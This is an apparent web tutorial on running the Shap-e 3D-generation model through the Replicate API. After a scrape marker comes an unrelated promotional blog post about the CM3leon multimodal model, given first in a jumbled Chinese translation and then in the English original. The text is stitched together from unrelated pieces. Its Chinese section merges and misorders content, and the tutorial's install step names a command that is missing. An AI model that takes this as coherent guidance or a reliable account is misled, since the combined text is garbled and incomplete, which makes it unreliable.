Created by cjwbw, Shap-e is a model that generates conditional 3D implicit functions. These functions form the basis for creating intricate 3D shapes based on input conditions. By employing neural networks, Shap-e understands the relationship between input conditions and the shape of the object. This makes it an invaluable tool for a broad range of applications including 3D modeling, computer graphics, virtual reality, and even scientific simulations. Find more about the creator and model on the creator page and the model details page respectively.

Whether it's generating realistic and customized 3D objects for video games, animations, and virtual reality environments, or creating complex architectural designs, Shap-e opens up a world of creative possibilities. It even allows for scientific simulations to generate accurate 3D representations of objects or environments.

Understanding the Inputs and Outputs of Shap-e

Before diving into how to use Shap-e, it's crucial to understand the inputs it takes and the outputs it produces. Knowing this can significantly enhance your user experience and help you get the most out of the model.

Note: you may also want to check out our guide on Point-e, a text-to-3d model generator from the same creator. We also have a guide for AdaMPI - a model that turns images into 3D scenes.

Inputs

Shap-e receives several inputs that dictate the 3D shape that will be generated. These include:

  • prompt: This is a text prompt for generating the 3D model, but it's ignored if an image is provided.

  • image: A synthetic view image used for generating the 3D model. For optimal results, it's recommended to remove the background from the input image.

  • guidance_scale: This sets the scale for guidance, with the default value set at 15.

  • batch_size: Specifies the number of outputs. The default value is 1.

  • render_mode: Allows you to choose a render mode, either 'nerf' or 'stf'. The default value is 'nerf'.

  • render_size: This sets the size of the renderer, and higher values take longer to render. The default value is 128.

  • save_mesh: If set to true, this saves the latents as meshes.

Outputs

In response to the inputs, Shap-e provides an array of URIs corresponding to the generated 3D models. The raw JSON schema of the model's output structure is as follows:

{ "type": "array", "items": { "type": "string", "format": "uri" }, "title": "Output"
}

Step-by-step Guide to Using Shap-e

After understanding the inputs and outputs, it's time to explore how to use Shap-e. This section will provide a step-by-step guide to using this model for creating intricate 3D shapes.

If coding isn't your cup of tea, Shap-e also comes with a demo. Though currently, there's no demo available for Shap-e, you can check the demo link for future updates. It's a great way to experiment with the model's parameters and receive instant feedback. For those keen on coding, the steps below will guide you on how to interact with Shap-e's Replicate API.

Step 1: Install the Client

First, install the Node.js client with the following command:

Step 2: Set API Token

Next, authenticate by setting your API token as an environment variable:

export REPLICATE_API_TOKEN=r8_*************************************

This is your Default API token, which should be kept private.

Step 3: Run the Model

Then, run the model:

import Replicate from "replicate"; const replicate = new Replicate({ auth: process.env.REPLICATE_API_TOKEN,
}); const output = await replicate.run( "cjwbw/shap-e:5957069d5c509126a73c7cb68abcddbb985aeefa4d318e7c63ec1352ce6da68c", { input: { prompt: "..." } }
);

You can also set a webhook URL to be called when the prediction is complete. Check out the webhook docs for details on setting that up.

Comparing Shap-e with Similar Models

AIModels.fyi offers a platform where you can find a multitude of AI models for diverse applications. On the website, you can also compare models like Shap-e with other similar models. To do this:

  1. Visit AIModels.fyi: Go to AIModels.fyi and navigate to the list of models.

  2. Select the Models for Comparison: Choose Shap-e and any other model(s) that you want to compare it with.

  3. Compare: Click on the "Compare" button to view a side-by-side comparison of the models. This will provide insights into the capabilities, inputs and outputs, and performance of the models.

This comparison feature can help you choose the most suitable model for your particular use case.

Conclusion

Shap-e offers a novel approach to generating detailed 3D shapes. Its use of AI not only streamlines the process of 3D modeling but also opens up the potential for creating complex and customizable shapes. Whether you're a developer working on a video game or an architect designing a new building, Shap-e provides a powerful tool that can enhance your creativity and productivity. It's certainly a model worth exploring and experimenting with on your AI journey.

Remember, AIModels.fyi is continually updating with new models. Stay tuned for more guides on other impressive AI models!

Subscribe or follow me on Twitter for more content like this!

item.title: 来认识一下 CM3leon，改变游戏规则的多模态生成模型！ | Meet CM3leon, the Game-Changing Multimodal Generative Model!
item.description:
萨蒂亚姆·贾恩

发表于 7 月 22 日

嘿，开发人员和人工智能爱好者们！ 今天，我们很高兴推出CM3leon （发音为“变色龙”），这是一种突破性的多模式模型，它突破了文本到图像和图像到文本生成的界限。 准备好以前所未有的方式潜入创造力和创新的世界！

这个单一的基础模型能够将文本无缝地转换为令人惊叹的图像，反之亦然。 告别有限的模型，迎接全新的可能性领域！ 让我们深入探讨一下 CM3leon 真正与众不同的原因：

前所未有的多功能性：CM3leon 可以根据任意内容轻松生成文本和图像序列。 与传统模式不同，它不受限制，充分释放多模式创造力的潜力。

  • 两阶段训练掌握：CM3leon 的秘密在于其两阶段训练过程 - 检索增强预训练和多任务监督微调 (SFT)。 这个配方产生了一个强大而高效的模型，设定了新的性能标准。

  • 获胜的扩展策略：扩展变得更加强大！ 凭借 CM3leon 在最广泛使用的图像生成基准（MS-COCO）上的惊人表现，取得了 4.88 的 FID 分数，正式取代了 Google 的 Parti 模型！ 凭借其文本引导图像生成和编辑能力，CM3leon 使您能够以前所未有的方式创建连贯且迷人的图像。 想象一下可能性：

    • 透明度是我们的指导原则。 在我们大步前进的过程中，我们致力于透明、公平和协作，为更光明的人工智能未来铺平道路。

      在 CM3leon 的引领下，我们正在踏上一段承诺无与伦比的创造力和创新的旅程。 我们相信，通过共同努力，我们可以塑造生成式人工智能的未来，创建具有赋能和启发的模型。 让我们探索可能性并更深入地探索虚拟宇宙的领域！

      今天就加入革命吧！ 分享您对 CM3leon 的想法和经验，让我们一起庆祝多模式生成模型的潜力。 我们将共同将人工智能推向新的高度，创造一个创造力无极限的未来！

    • 约翰·马克·布拉博斯 - 6 月 3 日

    原文:

    Sattyam Jain

    Posted on Jul 22

     

    Hey fellow developers and AI enthusiasts! 🤖 Are you ready to be blown away by the next big thing in generative AI? Today, we're thrilled to introduce CM3leon (pronounced "chameleon"), a groundbreaking multimodal model that's pushing the boundaries of text-to-image and image-to-text generation. Get ready to dive into the world of creativity and innovation like never before!

    🚀 A Leap in Generative AI 🚀

    CM3leon is not your average AI model - it's a force to be reckoned with! This single foundation model wields the power to seamlessly transform text into stunning images and vice versa. Say goodbye to limited models and hello to a whole new realm of possibilities! Let's dive into what makes CM3leon truly exceptional:

    🎯 The Power-Packed Features of CM3leon 🎯

    • Unprecedented Versatility: CM3leon can effortlessly generate sequences of text and images based on arbitrary content. Unlike traditional models, it's not bound by limitations, unleashing the full potential of multimodal creativity.

    • Two-Stage Training Mastery: CM3leon's secret sauce lies in its two-stage training process - retrieval-augmented pre-training and multitask supervised fine-tuning (SFT). This recipe produces a robust and efficient model, setting new performance standards.

    • Scaling Strategies for the Win: Scaling up just got even more powerful! CM3leon demonstrates that tokenizer-based transformers can rival existing generative diffusion-based models with only a fraction of the compute power.

    🌌 A Universe of Possibilities 🌌

    With CM3leon's astonishing performance on the most widely used image generation benchmark (MS-COCO), achieving an FID score of 4.88, it has officially dethroned Google's Parti model! 🥇 The potential of retrieval augmentation is undeniable, and CM3leon's ability to generate complex compositional objects is awe-inspiring.

    💡 Empowering Developers, Unleashing Creativity 💡

    CM3leon is not just a tool for the AI elite - it's a game-changer for all developers! With its text-guided image generation and editing prowess, CM3leon allows you to create coherent and captivating imagery like never before. Imagine the possibilities:

    • 🌈 Generate striking landscapes with the perfect blend of colors, textures, and lighting.

    • 🌌 Bring your wildest imaginations to life by visualizing fantastical characters and worlds.

    • 🎨 Edit images with natural language instructions, turning your creative visions into reality.

    • 💬 Answer questions about images or provide detailed captions with incredible accuracy.

    🌿 Step into a New Era of AI Transparency 🌿

    Transparency is our guiding principle. CM3leon was trained using a licensed dataset, showcasing its robust performance with a different data distribution. As we stride forward, we're committed to transparency, fairness, and collaboration, paving the way for a brighter AI future.

    🌟 Join the Journey 🌟

    With CM3leon leading the charge, we're embarking on a journey that promises unparalleled creativity and innovation. We believe that together, we can shape the future of generative AI, creating models that empower and inspire. Let's explore the possibilities and dive deeper into the realms of the metaverse!

    🚀 Embrace the Future with CM3leon 🚀

    Join the revolution today! Share your thoughts and experiences with CM3leon, and let's celebrate the potential of multimodal generative models. Together, we'll take AI to new heights, crafting a future where creativity knows no bounds!

    John Mark Bulabos - Jun 3
